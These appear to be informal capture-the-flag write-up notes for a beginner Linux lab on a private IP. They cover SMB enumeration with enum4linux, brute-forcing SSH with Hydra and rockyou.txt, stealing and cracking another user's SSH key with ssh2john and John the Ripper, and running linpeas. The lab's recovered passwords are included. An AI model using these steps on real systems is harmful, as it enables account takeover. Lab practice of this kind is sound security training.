For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

hints that we can crack a password
The /etc/shadow file is a crucial component of the Linux operating system, specifically for user account security. It is commonly found on Unix-like systems as well. The file stores encrypted password information for user accounts, as well as additional information related to password management.

Ports 139 and 445 are commonly associated with the Server Message Block (SMB) protocol, which is used for file and printer sharing in Windows networks. These ports are crucial for communication between devices in a Windows environment. However, they can also pose security risks if not properly configured.

If you've identified that ports 139 and 445 are open on the website you're pentesting, it suggests that the website might have Windows file sharing services running or could be using these ports for other purposes.

enum4linux IP -a 
finds usernames TAKES A WHILE
found kay and jan

put kay and jay into users.txt and use hydra to brute ssh (was open earlier
hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.187.195 ssh
found password, armanda (HYDRA TAKES SO LONG)

can now ssh into jan's account
found pass.bak
need to crack by getting kay's ssh key
cd .ssh
cat id_rsa
copy to my machine to use john to crack

put id_rsa into another id_rsa file on your own machine
go to /usr/share/john
sudo ./ssh2john.py ~/tempfolder/id_rsa.hash > ~/tempfolder/hash.txt
put the hash in another file

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
beeswax is kay's password
in jan's shell
ssh -i id_rsa kay@10.10.187.195
heresareallystrongpasswordthatfollowsthepasswordpolicy$$

ANOTHER WAY
when in jan's shell we can use linpeas
scp linpeas.sh jan@10.10.187.195:/dev/shm 
puts the file in jan's shm file

on jan's shell go to the shm file and chmod -x linpeas.sh to make it executable
777 might be better than x
execute
